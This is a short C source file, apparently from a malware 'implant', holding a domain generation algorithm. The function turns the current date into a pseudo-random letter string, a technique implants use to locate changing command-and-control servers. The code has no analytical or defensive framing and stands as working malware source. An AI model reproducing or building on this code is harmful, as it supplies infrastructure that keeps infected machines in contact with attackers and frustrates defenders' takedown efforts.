#include "implant.h"

char g_domain[DOMAIN_LENGTH];

void generate_domain(void)
{
  time_t ctime = time(NULL);
  struct tm* ltime = localtime(&ctime);
  unsigned long year = ltime->tm_year + 1900;
  unsigned long month = ltime->tm_mon + 1;
  unsigned long day = ltime->tm_mday;
  //printf("Time : %lu:%lu:%lu\n", year, month, day);

  for(unsigned i = 0 ; i < sizeof(g_domain) - 1; ++i)
  {
    month = ((month ^ 4 * month) >> 1) ^ 16 * (month & 0xFFFFFFF2);
    year = ((year ^ 8 * year) >> 4) ^ ((year & 0xFFFFFFF4) << 8);
    day = ((day ^ (day << 16)) >> 2) ^ ((day & 0xFFFFFFFA) << 4);
    g_domain[i] = (unsigned char)(((year ^ month ^ day) % 25) + 'a');
  }

  g_domain[sizeof(g_domain)-1] = 0;
}

